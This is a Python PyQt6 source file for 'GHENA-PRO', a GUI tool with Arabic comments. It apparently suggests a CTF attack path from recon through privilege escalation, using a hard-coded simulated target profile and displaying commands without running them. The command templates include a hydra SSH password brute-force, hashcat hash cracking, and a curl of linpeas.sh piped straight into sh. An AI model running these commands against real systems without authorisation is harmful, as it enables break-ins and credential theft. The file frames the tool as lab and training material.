# ghena_pro.py
# =========================================
# GHENA-PRO | Smart CTF Decision Engine
# =========================================
# - Profiles machine from IP (simulation)
# - Infers goals (Initial Access -> User -> PrivEsc)
# - Proposes tools & commands (NO execution)
# - GUI control center
# =========================================

import sys, re
from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt

# ----------------------------
# Plugins (اقتراح أوامر فقط)
# ----------------------------
class Plugins:
    @staticmethod
    def nmap(ip):
        return {
            "tool": "nmap",
            "reason": "اكتشاف المنافذ والخدمات لتكوين صورة أولية",
            "cmd": f"nmap -sC -sV -Pn {ip}"
        }

    @staticmethod
    def gobuster(ip):
        return {
            "tool": "gobuster",
            "reason": "منفذ HTTP مفتوح → تعداد مسارات مخفية",
            "cmd": f"gobuster dir -u http://{ip}/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html"
        }

    @staticmethod
    def hydra_ssh(ip):
        return {
            "tool": "hydra",
            "reason": "واجهة تسجيل/SSH محتمل → هجوم كلمات مرور (CTF)",
            "cmd": f"hydra -L users.txt -P rockyou.txt ssh://{ip}"
        }

    @staticmethod
    def ssh_login(ip):
        return {
            "tool": "ssh",
            "reason": "تم الحصول على بيانات اعتماد → دخول المستخدم",
            "cmd": f"ssh user@{ip}"
        }

    @staticmethod
    def linpeas():
        return {
            "tool": "linpeas",
            "reason": "وصول مستخدم → فحص رفع الصلاحيات",
            "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
        }

    @staticmethod
    def hash_crack():
        return {
            "tool": "hashcat",
            "reason": "تم استخراج هاش → محاولة كسره",
            "cmd": "hashcat -m <mode> hashes.txt rockyou.txt"
        }

# ----------------------------
# Machine Profiler (محاكاة)
# ----------------------------
def profile_machine(ip: str):
    # محاكاة ذكية (بدون فحص فعلي)
    return {
        "os": "Linux",
        "services": ["ssh", "http"],
        "web": True,
        "stage": "recon"
    }

# ----------------------------
# Decision Engine (PRO)
# ----------------------------
class DecisionEngine:
    def __init__(self, profile):
        self.profile = profile
        self.stage = profile["stage"]

    def next_actions(self):
        actions = []

        if self.stage == "recon":
            actions.append(Plugins.nmap(TARGET_IP))
            self.stage = "enum"

        elif self.stage == "enum":
            if self.profile["web"]:
                actions.append(Plugins.gobuster(TARGET_IP))
            actions.append(Plugins.hydra_ssh(TARGET_IP))
            self.stage = "access"

        elif self.stage == "access":
            actions.append(Plugins.ssh_login(TARGET_IP))
            self.stage = "user"

        elif self.stage == "user":
            actions.append(Plugins.linpeas())
            actions.append(Plugins.hash_crack())
            self.stage = "privesc"

        else:
            actions.append({
                "tool": "DONE",
                "reason": "تم الوصول لمرحلة root (نظريًا)",
                "cmd": "—"
            })

        return actions

# ----------------------------
# GUI
# ----------------------------
class GHENA_PRO(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("GHENA-PRO 🐙 | Smart CTF Control Center")
        self.setMinimumSize(1000, 750)
        self.engine = None
        self.init_ui()

    def init_ui(self):
        root = QWidget()
        layout = QVBoxLayout()

        title = QLabel("GHENA-PRO 🧠🐙")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("font-size:26px; font-weight:bold;")
        layout.addWidget(title)

        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("أدخل IP الماشين (CTF/Lab)")
        self.ip_input.setStyleSheet("padding:12px; font-size:14px;")
        layout.addWidget(self.ip_input)

        self.btn = QPushButton("Analyze & Propose Next Steps")
        self.btn.setFixedHeight(45)
        self.btn.setStyleSheet("font-size:15px; font-weight:bold;")
        self.btn.clicked.connect(self.analyze)
        layout.addWidget(self.btn)

        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet(
            "background:#0f0f0f;color:#39FF14;font-family:monospace;font-size:13px;"
        )
        layout.addWidget(self.console)

        root.setLayout(layout)
        self.setCentralWidget(root)

    def log(self, text):
        self.console.append(text)

    def analyze(self):
        global TARGET_IP
        TARGET_IP = self.ip_input.text().strip()
        if not TARGET_IP:
            QMessageBox.warning(self, "خطأ", "أدخل IP أولاً")
            return

        self.console.clear()
        self.log(f"[+] Profiling machine: {TARGET_IP}")

        profile = profile_machine(TARGET_IP)
        self.engine = DecisionEngine(profile)

        self.log(f"[i] OS: {profile['os']}")
        self.log(f"[i] Services: {', '.join(profile['services'])}")
        self.log("[i] Inferred goal: Initial Access → User → PrivEsc\n")

        actions = self.engine.next_actions()
        for a in actions:
            self.log("────────────────────────────")
            self.log(f"🛠 Tool: {a['tool']}")
            self.log(f"📌 Why: {a['reason']}")
            self.log(f"📜 Command:\n{a['cmd']}")

        self.log("\n[⚠️] ملاحظة: الأوامر معروضة فقط (بدون تنفيذ)")

# ----------------------------
# Run
# ----------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = GHENA_PRO()
    win.show()
    sys.exit(app.exec())
